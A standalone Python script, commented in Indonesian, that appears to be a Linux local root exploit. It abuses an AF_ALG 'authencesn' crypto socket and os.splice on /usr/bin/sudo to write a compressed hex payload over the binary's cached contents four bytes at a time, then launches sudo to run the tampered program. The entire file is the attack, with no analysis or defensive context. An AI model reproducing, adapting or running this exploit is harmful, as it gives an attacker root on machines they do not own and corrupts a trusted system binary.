#!/usr/bin/env python3

import os
import zlib
import socket

def hex_to_bytes(x: str) -> bytes:
    return bytes.fromhex(x)

def send_chunk(file_fd: int, offset: int, chunk: bytes) -> None:
    # Buat socket
    sock = socket.socket(38, 5, 0)
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    
    # Config socket options
    level = 279
    sock.setsockopt(level, 1, hex_to_bytes('0800010000000010' + '0' * 64))
    sock.setsockopt(level, 5, None, 4)
    
    # Accept connection
    client, _ = sock.accept()
    
    # Prepare data
    size = offset + 4
    null_byte = hex_to_bytes('00')
    
    # Send with ancillary data
    client.sendmsg(
        [b"A" * 4 + chunk],
        [
            (level, 3, null_byte * 4),
            (level, 2, b'\x10' + null_byte * 19),
            (level, 4, b'\x08' + null_byte * 3),
        ],
        32768
    )
    
    # Zero-copy file transfer
    read_pipe, write_pipe = os.pipe()
    os.splice(file_fd, write_pipe, size, offset_src=0)
    os.splice(read_pipe, client.fileno(), size)
    
    # Receive response
    try:
        client.recv(8 + offset)
    except:
        pass
    
    # Cleanup
    client.close()
    sock.close()

def main():
    # Buka file target
    file_fd = os.open("/usr/bin/sudo", os.O_RDONLY)
    
    # Decompress payload
    hex_payload = (
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d"
        "16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff5936"
        "11fcacfa499979fac5190c0c0c0032c310d3"
    )
    payload = zlib.decompress(bytes.fromhex(hex_payload))
    
    # Kirim chunk 4-byte
    for i in range(0, len(payload), 4):
        send_chunk(file_fd, i, payload[i:i+4])
    
    # Eksekusi binary
    os.system("sudo")
    
    # Cleanup
    os.close(file_fd)

if __name__ == "__main__":
    main()
